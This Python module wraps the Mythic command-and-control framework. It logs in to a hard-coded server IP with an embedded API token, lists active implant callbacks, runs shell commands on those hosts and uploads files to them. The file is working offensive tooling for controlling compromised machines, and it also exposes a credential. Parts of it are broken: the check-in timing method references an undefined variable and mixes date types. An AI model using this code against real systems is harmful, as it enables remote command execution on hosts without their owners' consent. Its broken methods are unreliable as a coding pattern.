from Operations import Client
from mythic import mythic
from mythic.mythic_classes import *
from datetime import datetime
import time
import re

class MythicC2():
    def __init__(self):
        # Should be singleton
        self.mythicInstance: mythic = None
        self.apitoken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTQ0NDkwMzgsImlhdCI6MTY5NDQzNDYzOCwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSJ9.LvxS_fIGrc-W4xLswYRwAa3BbMCymoz0DJgddU666Yo"

    # def __init__(self, ip):
    #     self.ipAddress = ip

    async def connect(self):
        # Todo: grab apitoken & ip from config
        self.mythicInstance = await mythic.login("34.237.94.238", apitoken=self.apitoken)
        return self

    async def getActiveClients(self):
        clients = await mythic.get_all_active_callbacks(self.mythicInstance)

        activeClients: list[MythicClient] = []
        for x in clients:
            displayID = x['display_id']
            client = MythicClient(displayID, self.mythicInstance)
            activeClients.append(client)
        return activeClients

# Maybe this should be named MythicC2
class MythicClient(Client.Client):
    mythicInstance = None
    displayID = None
    Mythic()

    def __init__(self, displayID, mythicInstance):
        self.displayID = displayID
        self.mythicInstance = mythicInstance

    async def getIPAddress(self):
        returnAttributes = """
            ip
            active
            id
            display_id
        """

        clients = await mythic.get_all_active_callbacks(self.mythicInstance, custom_return_attributes=returnAttributes)
        for client in clients:
            if client['display_id'] == self.displayID:
                rawIP = client['ip']
                pattern = re.compile(r"\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b", re.IGNORECASE)
                ips = pattern.findall(rawIP)[0]
                return ips[0]

    async def getLastCheckinSeconds(self):
        timestamp = await self.getLastCheckinTimestamp()
        if(timestamp == None):
            return None

        print(timestamp)
        lastCheckin = now.strftime("%m/%d/%Y, %H:%M:%S")
        currentTime = datetime.date.today()
        delta = currentTime - lastCheckin
        totalSeconds = delta.total_seconds()
        return totalSeconds
        

    async def getLastCheckinTimestamp(self):
        returnAttributes = """
            last_checkin
            active
            id
            display_id
        """

        clients = await mythic.get_all_active_callbacks(self.mythicInstance, custom_return_attributes=returnAttributes)
        for client in clients:
            if client['display_id'] == self.displayID:
                return client['last_checkin']
        return None


    async def executeShell(self, shellCommand):
        args = {"arguments": shellCommand}
        return await mythic.issue_task_and_waitfor_task_output(self.mythicInstance, "shell", args, self.displayID)

    async def executeCommand(self, command, parameters):
        # The parameters are actually a object that are passed in, the parameters of that object can be found by doing "help COMMANDNAMEHERE" in mythic
        return await mythic.issue_task_and_waitfor_task_output(self.mythicInstance, command, parameters, self.displayID)

    async def getMythicInstance(self):
        return self.mythicInstance

    async def upload_file(self, fileBytes, remotePath):
        fileID = await mythic.register_file(self.mythicInstance, "test.txt", fileBytes)

        fileJSON = {
            "host":"",
            "remote_path":remotePath,
            "file":fileID
        }

        await self.executeCommand("upload", fileJSON)